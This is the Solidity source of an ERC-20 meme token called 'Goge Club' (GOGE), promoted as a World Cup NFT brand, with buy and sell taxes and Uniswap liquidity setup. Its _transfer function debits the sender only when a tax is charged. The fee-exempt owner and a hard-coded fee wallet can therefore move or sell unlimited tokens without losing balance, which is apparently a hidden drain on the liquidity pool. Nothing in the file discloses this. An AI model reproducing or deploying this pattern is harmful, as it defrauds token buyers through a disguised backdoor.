// SPDX-License-Identifier: MIT

/*
Goge is a practical collection of a ball-like character, inspired by the official ball of each season, which has traveled from the beginning to the last World Cup, and in its first collection, it shows the participating countries with their distinctive characteristics and the champion of each season, and in the packages The next one deals with the memorable moments of the World Cup in the form of a fun and professional NFT series.

A brand that is determined to innovate and be at the forefront of the Metaverse world and push the boundaries of Web3.

Website: https://www.goge.club
Telegram:  https://t.me/goge_erc
Twitter: https://twitter.com/goge_erc
App: https://app.goge.club
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMathLib {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMathLib: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMathLib: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMathLib: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMathLib: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract GOGE is Context, IERC20, Ownable {
    using SafeMathLib for uint256;
    
    string private constant _name= "Goge Club";
    string private constant _symbol= "GOGE";

    uint8 private constant _decimals= 9;
    uint256 private constant _totalSupply = 10 ** 9 * 10**_decimals;

    uint256 private _initialBuyTax=14;
    uint256 private _initialSellTax=25;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=14;
    uint256 private _reduceSellTaxAt=14;
    uint256 private _preventSwapBefore=14;
    uint256 private _buyers=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    IUniswapRouter private uniswapRouterV2;
    address private uniswapPairAddress;
    bool private _tradeEnabled;
    bool private _swapping= false;
    bool private _feeSwapEnabled= false;

    uint256 public _maxTxAmount= 20 * 10 ** 6 * 10**_decimals;
    uint256 public _maxWallet= 20 * 10 ** 6 * 10**_decimals;
    uint256 public _feeSwapAt= 10 ** 5 * 10**_decimals;
    uint256 public _feeSwapMax= 10 ** 7 * 10**_decimals;
    address payable private _feeAddress = payable(0xEfaA5959500603d184493292bD2C0690a2F78327);

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor () {
        _balances[address(this)] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_feeAddress] = true;

        emit Transfer(address(0), address(this), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function swapToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouterV2.WETH();
        _approve(address(this), address(uniswapRouterV2), tokenAmount);
        uniswapRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function openTrading() external onlyOwner() {
        require(!_tradeEnabled, "Trading is already open");
        uniswapRouterV2 = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapRouterV2), _totalSupply);
        uniswapPairAddress = IUniswapFactory(uniswapRouterV2.factory()).createPair(address(this), uniswapRouterV2.WETH());
        uniswapRouterV2.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapPairAddress).approve(address(uniswapRouterV2), type(uint).max);
        _feeSwapEnabled = true;
        _tradeEnabled = true;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a > b) ? b : a;
    }

    receive() external payable {}
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeLimits() external onlyOwner {
        _maxWallet = _maxTxAmount = _totalSupply;
        emit MaxTxAmountUpdated(_totalSupply);
    }
    
    function sendFees(uint256 amount) private {
        _feeAddress.transfer(amount);
    }
    
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner() && !_isExcludedFromFee[from]) {
            taxAmount = amount.mul((_buyers > _reduceBuyTaxAt) ? _finalBuyTax  :_initialBuyTax).div(100);

            if (from == uniswapPairAddress && to != address(uniswapRouterV2) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWallet, "Exceeds the _maxWallet.");
                _buyers++;
            }

            if (to == uniswapPairAddress && from != address(this)) {
                taxAmount = amount.mul((_buyers>_reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_swapping && to == uniswapPairAddress && _feeSwapEnabled && contractTokenBalance > _feeSwapAt && _buyers > _preventSwapBefore && amount > _feeSwapAt) {
                swapToETH(min(amount, min(contractTokenBalance, _feeSwapMax)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendFees(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          _balances[from] = _balances[from].sub(amount);
          emit Transfer(from, address(this), taxAmount);
        }
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
}